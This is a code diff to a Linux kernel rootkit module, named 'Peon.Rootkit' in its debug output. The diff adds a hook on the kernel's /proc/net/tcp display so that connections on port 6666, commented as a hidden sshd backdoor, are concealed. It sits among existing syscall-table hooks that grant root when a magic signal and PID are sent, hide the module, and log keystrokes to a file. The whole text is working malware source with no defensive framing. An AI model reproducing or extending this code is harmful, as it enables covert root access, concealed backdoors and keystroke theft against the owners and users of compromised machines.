@@ -27,21 +27,30 @@
 #include <asm/errno.h>
 #include <asm/io.h>
 #include <asm/segment.h>
+#include <net/tcp.h>
 
-
-#define HOOK_READ
+//#define HOOK_READ
 //#define HIDE_MODULE
 #define SECRETLINE "_peon_"
 #define SECRETFILE "_root_"
-#define NETWORK
+//#define NETWORK
 #define DEBUG
 #define SIG_4_ROOT 9
 #define PID_4_ROOT 88888
 #define SIG_4_SHOW_MOD 9
 #define PID_4_SHOW_MOD 22222
-#define ETH_P_ALL 0x0003
+
+/*from net/ipv4/tcp_ipv4.c*/
+#define TMPSZ 150
+
+/*hide sshd*/
+#define PORT_TO_HIDE 6666
 #define KEYLOG_PATH "/home/keylogger.txt"
 #define TEST_PATH "/home/peon/test.txt"
+
+
+#define ETH_P_ALL 0x0003
+
 
 #if defined(__LP64__) || defined(_LP64) //__x86_64 /* 64 bits machine */
 #define OS_64_BITS
@@ -61,6 +70,20 @@ struct linux_dirent {
 };
 
 unsigned long long file_saved_offset = 0;
+
+
+
+char *strnstr(const char *haystack, const char *needle, size_t n)
+{
+        char *s = strstr(haystack, needle);
+        if (s == NULL)
+                return NULL;
+        if (s-haystack+strlen(needle) <= n)
+                return s;
+        else
+                return NULL;
+}
+
 
 /*
  * process hiding functions
@@ -515,7 +538,7 @@ asmlinkage long kill_hook_call(pid_t pid, int sig) {
         FIRST_SHOW_MODULE = 0; // only one try
         /* attach save module to the list of module by seaching snd module */
         list_add(&mod->list, &find_module("snd")->list);
-#ifdef DEBUG	
+#ifdef DEBUG    
         printk(KERN_ALERT "Peon.Rootkit: show module");
 #endif
     }
@@ -561,6 +584,51 @@ int dev_func(struct sk_buff *skb, struct net_device *dev, struct packet_type *pk
     kfree_skb(skb);
     return 0;
 }
+
+int (*old_tcp4_seq_show)(struct seq_file*, void *) = NULL;
+
+int hacked_tcp4_seq_show(struct seq_file *seq, void *v)
+{
+        int retval=old_tcp4_seq_show(seq, v);
+
+        char port[12];
+
+        sprintf(port,"%04X",PORT_TO_HIDE);
+
+        if(strnstr(seq->buf+seq->count-TMPSZ,port,TMPSZ))
+                seq->count -= TMPSZ;
+return retval;   
+}
+
+
+void init_hide_net(void){
+
+struct tcp_seq_afinfo *my_afinfo = NULL;
+        struct proc_dir_entry *my_dir_entry = init_net.proc_net->subdir;
+
+        while (strcmp(my_dir_entry->name, "tcp"))
+                my_dir_entry = my_dir_entry->next;
+
+        if((my_afinfo = (struct tcp_seq_afinfo*)my_dir_entry->data))
+        {
+                old_tcp4_seq_show = my_afinfo->seq_ops.show;
+                my_afinfo->seq_ops.show = hacked_tcp4_seq_show;
+        }
+
+}
+void exit_hide_net(void){
+ 	struct tcp_seq_afinfo *my_afinfo = NULL;
+        struct proc_dir_entry *my_dir_entry = init_net.proc_net->subdir;
+ 
+        while (strcmp(my_dir_entry->name, "tcp"))
+                my_dir_entry = my_dir_entry->next;
+        
+        if((my_afinfo = (struct tcp_seq_afinfo*)my_dir_entry->data))
+        {
+                my_afinfo->seq_ops.show=old_tcp4_seq_show;
+        }
+}
+
 
 int init_module(void) {
 
@@ -656,6 +724,7 @@ int init_module(void) {
 
     syscall_table[__NR_open] = (void*) hook_open_call;
 #endif
+init_hide_net();
 
     enable_wp();
 
@@ -669,7 +738,7 @@ int init_module(void) {
 void cleanup_module(void) {
 
     disable_wp();
-
+exit_hide_net();
     /* Set the orignal call*/
     syscall_table[__NR_kill ] = (void*) kill_orig_call;
 
